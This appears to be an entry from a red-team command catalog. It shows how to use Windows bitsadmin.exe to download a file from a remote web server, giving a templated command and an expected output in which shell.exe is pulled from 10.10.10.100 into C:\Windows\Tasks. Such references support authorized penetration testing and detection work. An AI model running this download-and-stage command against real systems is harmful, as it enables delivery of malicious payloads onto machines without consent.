---
id: 147362a9-7135-4ebb-8310-c12b8a5e2600
name: Bitsadmin Download File from a Remote Web Server
type: command
executor: command_prompt
data: bitsadmin.exe /transfer "foo" /download http://$_REMOTE_IP/$_FILENAME C:\_$DEST_DIR\$_FILENAME
output: "C:\\>bitsadmin.exe /transfer \"foo\" /download http://10.10.10.100/shell.exe\
  \ C:\\Windows\\Tasks\\shell.exe \nDISPLAY: 'foobar' TYPE: DOWNLOAD STATE: TRANSFERRED\n\
  PRIORITY: NORMAL FILES: 1 / 1 BYTES: 7168 / 7168 (100%)\nTransfer complete."
created_at: '2019-11-20T19:04:07.107221+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Bitsadmin Download File from a Remote Web Server

```command_prompt
bitsadmin.exe /transfer "foo" /download http://$_REMOTE_IP/$_FILENAME C:\_$DEST_DIR\$_FILENAME
```

## Expected Output

```
C:\>bitsadmin.exe /transfer "foo" /download http://10.10.10.100/shell.exe C:\Windows\Tasks\shell.exe 
DISPLAY: 'foobar' TYPE: DOWNLOAD STATE: TRANSFERRED
PRIORITY: NORMAL FILES: 1 / 1 BYTES: 7168 / 7168 (100%)
Transfer complete.
```


